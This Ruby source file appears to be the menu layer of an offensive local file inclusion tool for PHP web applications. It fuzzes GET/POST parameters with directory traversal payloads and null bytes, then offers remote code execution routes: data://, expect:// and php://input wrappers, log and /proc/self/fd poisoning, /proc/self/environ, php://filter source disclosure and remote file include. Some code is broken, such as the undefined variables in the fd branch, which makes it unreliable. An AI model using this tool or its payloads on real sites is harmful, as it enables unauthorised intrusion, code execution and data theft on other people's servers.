# Help Menu
def includer_menu_help
  puts "Available Options: ".underline.white
  puts "clear".light_yellow + "   => ".white + "Clear Terminal".light_red
  puts "back".light_yellow + "    => ".white + "Return to Main Menu".light_red
  puts "fuzz ".light_yellow + "   => ".white + "Fuzz GET/POST Link for File Include".light_red
end

# Includer Menu for CLI App
def includer_menu
  puts
  prompt = "(includ3r)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^c$|^clear$|^cls$/i
      cls
      banner
      includer_menu
    when /^h$|^help$|^ls$/i
      puts
      includer_menu_help
      includer_menu
    when /^exit$|^quit$|^back$/i
      puts
      print_error("Returning to Main Menu....")
      main_menu
    when /^local$|^OS$/i
      local_shell
      includer_menu
    when /^config$/i
      print_status("Current Configuration: ")
      pp $config
      includer_menu
    when  /^ip$/i
      ip_info
      includer_menu
    when /^ip2host$|^host2ip$/i
      host = Readline.readline("   Target IP or Domain: ", true)
      dnsenum = DNSEnum.new(host.strip.chomp)
      ip, domain, hostname = dnsenum.host_info
      puts
      print_status("IP: #{ip}")
      print_status("Domain: #{domain}") unless domain == ip
      print_status("Hostname: #{hostname}\n\n")
      includer_menu
    when /^!(.+)/
      # Execute system commands in terminal
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      includer_menu
    when /^fuzz$/i
      print_status("Need to gather some basic info first....")
      while(true)
        print_caution("Select Request Type: ")
        print_caution("1) GET")
        print_caution("2) POST\n")
        prompt = "(Enter Selection)> "
        while line = Readline.readline("#{prompt}", true)
          answer = line.chomp
          case answer.to_i
          when 1
            line = Readline.readline("(GET URL)> ", true)
            @includer_url = line.chomp
            @includer_postdata=nil
            break
          when 2
            line = Readline.readline("(POST URL)> ", true)
            @includer_url = line.chomp
            line = Readline.readline("(POST DATA)> ", true)
            @includer_postdata = line.chomp
            break
          else
            print_line("")
            print_error("Oops, Didn't quite understand that one")
            print_error("Please Choose a Valid Option From Menu Below Next Time.....")
            print_line("")
          end
        end
        print_line("")
        http=EasyCurb.new
        # Check and make sure the site is up and try to identify potential injection point(s)
        # rez = [ response_body, response_code, repsonse_time, response_headers ]
        print_status("Confirming site is up....")
        if @includer_postdata.nil?
          rez = http.get(@includer_url)
        else
          rez = http.post(@includer_url, @includer_postdata)
        end
        if rez[1] != 200
          print_error("Having Problems reaching site!")
          print_error("Try to reconfigure or follow up manually.....\n")
          @includer_url=nil; @includer_postdata=nil; # Reset shit so they cant move forward with a link we can handle
          break
        else
          print_good("#{rez[1]} - Site is up!")
          print_status("########### RESPONSE HEADERS ################")
          print_line("\n#{rez[3].chomp}")
          print_status("#############################################")
          print_line("")
          rez[3].split("\n").each do |header|
            if header =~ /Server: (.+)\s/i
              srv = $1
              if srv =~ /IIS|Win32|Win64|\.NET|Windows/
                @os='Windows'
              else
                @os='Linux'
              end
            end
          end
        end
        if @includer_postdata.nil?
          paras = @includer_url.split('?')[1]
          if not paras.nil?
            parameters = find_parameters(paras)
          else
            ############## NO PARAMETERS ##############
            # Add logic to inject into non parameter links later....
            ###########################################
            print_error("No Parameters found in link!")
            print_error("Not sure how to handle, bugging out....")
            @includer_url=nil; @includer_postdata=nil; # Reset
            break
          end
        else #POST
          parameters = find_parameters(@includer_postdata)
        end
        print_caution("Identify which parameter & value set we will be injecting into: ")
        count=0
        paramz={}
        parameters.each do |k, v|
          print_caution("#{count}) #{k}=#{v}")
          paramz[count] = "#{k}=#{v}"
          count=count.to_i + 1
        end
        while line = Readline.readline("(Param ID)> ", true)
          answer = line.chomp
          @includer_park=paramz[answer.to_i].split('=')[0]
          @includer_parv=paramz[answer.to_i].split('=')[1]
          break
        end
        break
      end

      steps = [ "../", "..%2f", "..%25%5c", "..%5c", "..%bg%qf" ]
      while(true)
        print_caution("Select Traversal Method: ")
        print_caution("1) ../")
        print_caution("2) ..%2f")
        print_caution("3) ..%25%5c")
        print_caution("4) ..%5c")
        print_caution("5) ..%bg%qf")
        answer = Readline.readline("(Traversal Method)> ", true)
        if answer.chomp.to_i > 0 and answer.chomp.to_i <= 5
          case answer.chomp.to_i
          when 1
            @step=steps[0]
          when 2
            @step=steps[1]
          when 3
            @step=steps[2]
          when 4
            @step=steps[3]
          when 5
            @step=steps[4]
          end
          break
        else
          print_line("")
          print_error("Oops, Didn't quite understand that one")
          print_error("Please Choose a Valid Option From Menu Below Next Time.....")
          print_line("")
        end
      end
      min = Readline.readline("(Minimum Number of Directories to Traverse)> ", true)
      @min=min.chomp.to_i
      max = Readline.readline("(Max Number of Directories to Traverse)> ", true)
      @max=max.chomp.to_i
      nul = Readline.readline("(Enable Null Byte (Y/N))> ", true)
      if nul[0].upcase == 'Y'
        @null=true
      end
      print_status("OK, running tests now...")
      @lfi=Includer.new(@includer_park, @includer_parv, @step, @null)
      if @lfi.base_test(@includer_url, @includer_postdata, @min, @max)
        sleep(2)
        cls
        banner
        includer_vuln_menu_usage
        includer_vuln_menu
      else
        answer = Readline.readline("(Try PHP Wrappers (Y/N)?)> ", true)
        if answer.chomp[0].upcase == 'Y'
          cls
          banner
          wrapper_mini_usage
          wrapper_mini_menu
        else
          puts
          print_error("OK, Try adjusting settings or confirming manually to be sure....\n")
        end
      end
      includer_menu
    else
      puts
      print_error("Oops, Didn't quite understand that one!")
      print_error("Please try again...\n\n")
      includer_menu
    end
  end
end

# PHP Wrappers Methods Menu
def wrapper_mini_usage
  puts "List of available commands and general description:".underline.white
  puts "back ".light_yellow + "    => ".white + "Return to Main Menu".light_red
  puts "data ".light_yellow + "    => ".white + "data://".light_red
  puts "expect ".light_yellow + "  => ".white + "expect://".light_red
  puts "filters ".light_yellow + " => ".white + "php://filters".light_red
  puts "input ".light_yellow + "   => ".white + "php://input".light_red
  puts "rfi ".light_yellow + "     => ".white + "Remote File Include".light_red
  print_line("")
end

# PHP Wrappers Methods
def wrapper_mini_menu
  prompt = "(Wrapp3rs)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^!(.+)/
      cmd=$1.strip.chomp
      res = commandz(cmd)
      print_line("\n#{res.join().chomp}")
      wrapper_mini_menu
    when /^clear|^cls|^banner/i
      cls
      banner
      wrapper_mini_menu
    when /^help|^h$|^ls$/i
      wrapper_mini_usage
      wrapper_mini_menu
    when /^exit|^quit|^back/i
      print_line("")
      print_error("OK, Returning to Main Menu....")
      main_menu
    when /^local$|^OS$/i
      local_shell
      wrapper_mini_menu
    when  /^ip$/i
      ip_info
      wrapper_mini_menu
    when /^input|^php:\/\/input/i
      print_line("")
      if @includer_postdata.nil?
        @lfi.input_wrapper(@includer_url)
      else
        print_error("Unsure how to handle php://input on a POST link, sorry.....")
      end
      print_line("")
      wrapper_mini_menu
    when /^filter|^php:\/\/filter/i
      print_line("")
      @lfi.filters_wrapper(@includer_url, @includer_postdata)
      print_line("")
      wrapper_mini_menu
    when /^data/i
      print_line("")
      @lfi.data_wrapper(@includer_url, @includer_postdata)
      print_line("")
      wrapper_mini_menu
    when /^expect/i
      print_line("")
      @lfi.expect_wrapper(@includer_url, @includer_postdata)
      print_line("")
      wrapper_mini_menu
    when /^rfi/i
      print_line("")
      @lfi.rfi(@includer_url, @includer_postdata)
      print_line("")
      wrapper_mini_menu
    else
      cls
      print_line("")
      print_error("Oops, Didn't quite understand that one")
      print_error("Please Choose a Valid Option From Menu Below Next Time.....")
      print_line("")
      wrapper_mini_usage
      wrapper_mini_menu
    end
  end
end

# LFI Confirmed Methods Help Menu
def includer_vuln_menu_usage
  puts "Available Includer Commands and Description:".underline.white
  puts "back ".light_yellow + "    => ".white + "Return to Main Menu".light_red
  puts "data ".light_yellow + "    => ".white + "data://".light_red # RCE via data:// wrapper (PHP 5.2+)
  puts "environ ".light_yellow + " => ".white + "/proc/self/environ".light_red  #/proc/self/environ method
  puts "expect ".light_yellow + "  => ".white + "expect://".light_red # PHP 4.3.0+ (PECL) Note: This wrapper is not enabled by default, execs via PTY
  puts "fd ".light_yellow + "      => ".white + "/proc/self/fd/".light_red # /proc/self/fd/ Log Poisoning Method
  puts "filters ".light_yellow + " => ".white + "php://filters".light_red  # Source Disclosure via PHP Filters Method
  puts "input ".light_yellow + "   => ".white + "php://input".light_red # This wrapper accepts RAW POST data as argument for easy RCE
  puts "logs ".light_yellow + "    => ".white + "Log Files".light_red # Common Log Poisoning Attack
  puts "rfi ".light_yellow + "     => ".white + "Remote File Include".light_red  # RFI RCE
  print_line("")
end

# LFI Confirmed Methods
def includer_vuln_menu
  prompt = "(includ3r)> "
  while line = Readline.readline("#{prompt}", true)
    cmd = line.chomp
    case cmd
    when /^clear|^cls|^banner/i
      cls
      banner
      includer_vuln_menu
    when /^help|^h$|^ls$/i
      includer_vuln_menu_usage
      includer_vuln_menu
    when /^exit|^quit|^back/i
      print_line("")
      print_error("OK, Returning to Main Menu....")
      main_menu
    when /^environ|^enviro$|^\/proc\/self\/evniro/i
      print_line("")
      @lfi.proc_environ(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    when /^fd$|^fd.links|^\/proc\/self\/fd/i
      print_line("")
      if @os == 'Windows'
        print_error("Your target appears to be Winblows!")
        print_error("This option is only available for some Linux based targets!")
      else
        if @fdsize.nil?
          vuln=false
          if @min.to_i == 0
            test = "/proc/self/status"
          else
            test = "#{@stepstone}proc/self/status"
          end
          if postdata.nil? #GET
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
            testlink="#{link.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
            vuln=true if @lfi.basic(testlink)
          else #POST
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}#{@poison}")}" if @null
            testlink="#{postdata.sub("#{@includer_park}=#{@includer_parv}", "#{@includer_park}=#{test}")}" unless @null
            vuln=true if @lfi.basic(link, testlink)
          end
        else
          vuln=true
          print_good("Looks like /proc/self/status has already been found!")
          print_good("Uid: #{@uid}")
          print_good("Gid: #{@gid}")
          print_good("Pid: #{@pid}")
          print_good("FDSize: #{@fdsize}")
        end
        if vuln
          print_status("Total Possible File Descriptor Links: #{@fdsize}")
          answer = Readline.readline("(Enumerate All Possible Links (Y/N)?)> ", true)
          if answer.chomp[0].upcase == 'Y'
            s = Readline.readline("(Starting Num)> ", true)
            e = Readline.readline("(Ending Num)> ", true)
            @lfi.fd(@includer_url, @includer_postdata, s.chomp.to_i, e.chomp.to_i) # Partial Enumeration
          else
            @lfi.fd(@includer_url, @includer_postdata, 0, @fdsize) # Full Enumeration
          end
        else
          @lfi.fd(@includer_url, @includer_postdata, 0, 32) # Hail Mary Check
        end
      end
      print_line("")
      includer_vuln_menu
    when /^logs$|^log.links|^log.poison/i
      print_line("")
      @lfi.logs(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    when /^input|^php:\/\/input/i
      print_line("")
      if @includer_postdata.nil?
        @lfi.input_wrapper(@includer_url)
      else
        print_error("Unsure how to handle php://input on a POST link, sorry.....")
      end
      print_line("")
      includer_vuln_menu
    when /^filter|^php:\/\/filter/i
      print_line("")
      @lfi.filters_wrapper(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    when /^data/i
      print_line("")
      @lfi.data_wrapper(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    when /^expect/i
      print_line("")
      @lfi.expect_wrapper(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    when /^rfi/i
      print_line("")
      @lfi.rfi(@includer_url, @includer_postdata)
      print_line("")
      includer_vuln_menu
    else
      cls
      print_line("")
      print_error("Oops, Didn't quite understand that one")
      print_error("Please Choose a Valid Option From Menu Below Next Time.....")
      print_line("")
      includer_vuln_menu_usage
      includer_vuln_menu
    end
  end
end

